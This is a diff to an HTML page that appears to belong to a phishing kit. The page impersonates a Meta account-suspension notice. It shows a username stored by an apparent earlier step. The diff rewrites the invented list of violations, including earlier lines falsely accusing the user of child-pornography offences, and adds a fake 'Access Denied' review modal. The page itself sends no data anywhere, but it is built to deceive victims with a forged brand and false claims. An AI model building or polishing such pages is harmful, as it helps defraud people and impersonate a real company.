@@ -20,8 +20,8 @@
     }
 
     .container {
-      max-width: 600px;
-      margin: 60px auto;
+      max-width: 650px;
+      margin: 50px auto;
       background: white;
       padding: 30px;
       border-radius: 8px;
@@ -53,13 +53,13 @@
 
     .review-button {
       display: inline-block;
-      margin-top: 20px;
-      padding: 10px 20px;
+      margin-top: 25px;
+      padding: 12px 25px;
       background-color: #1877f2;
       color: white;
       border: none;
       border-radius: 5px;
-      text-decoration: none;
+      font-size: 15px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -74,6 +74,61 @@
       margin-top: 40px;
       color: #888;
     }
+
+    .notice {
+      background-color: #fff9c4;
+      padding: 10px;
+      border-left: 4px solid #fbc02d;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    /* Modal */
+    #accessModal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      display: none;
+      background-color: rgba(0,0,0,0.5);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+
+    .modal-box h3 {
+      color: #d93025;
+      margin-bottom: 10px;
+    }
+
+    .modal-box p {
+      color: #555;
+      font-size: 14px;
+    }
+
+    .modal-close {
+      margin-top: 20px;
+      background: #1877f2;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .modal-close:hover {
+      background-color: #145dbf;
+    }
   </style>
 </head>
 <body>
@@ -87,26 +142,47 @@
       Username attempted: <span id="suspendedUser">Unknown</span>
     </div>
 
-    <p>Your account has been temporarily suspended due to activity that goes against our <strong>Community Standards</strong>.</p>
+    <p>Your account has been temporarily suspended due to activity that violates our <strong>Community Standards</strong>.</p>
 
-    <p><strong>Why this happened:</strong></p>
+    <p><strong>Violations may include:</strong></p>
     <ul>
-      <li>Pornographic content share</li>
-      <li>Child pornographic content access</li>
-      <li>Repeated policy violations</li>
+      <li>Sharing explicit or adult content that violates our policies</li>
+      <li>Graphic violence or disturbing imagery</li>
+      <li>Spamming, phishing, or impersonation behavior</li>
+      <li>Suspicious login patterns or bot-like activity</li>
     </ul>
 
-    <p>If you believe this was a mistake, you can request a review. We'll take a closer look at your activity and get back to you.</p>
+    <div class="notice">
+      Suspended accounts are reviewed carefully. If this was a mistake, you can request a review. Some reviews may be restricted based on the severity of the violation.
+    </div>
 
-    <a href="#" class="review-button">Request Review</a>
+    <button class="review-button" onclick="openModal()">Request Review</button>
   </div>
 
   <div class="footer">© 2025 Meta Platforms, Inc.</div>
 
+  <!-- Access Denied Modal -->
+  <div id="accessModal">
+    <div class="modal-box">
+      <h3>Access Denied</h3>
+      <p>This account is not eligible for review due to severe policy violations. Please contact support for more information.</p>
+      <button class="modal-close" onclick="closeModal()">Close</button>
+    </div>
+  </div>
+
   <script>
-    // Get username from localStorage and show
+    // Show attempted username
     const user = localStorage.getItem("storedUsername") || "Unknown";
     document.getElementById("suspendedUser").innerText = user;
+
+    // Modal logic
+    function openModal() {
+      document.getElementById("accessModal").style.display = "flex";
+    }
+
+    function closeModal() {
+      document.getElementById("accessModal").style.display = "none";
+    }
   </script>
 
 </body>
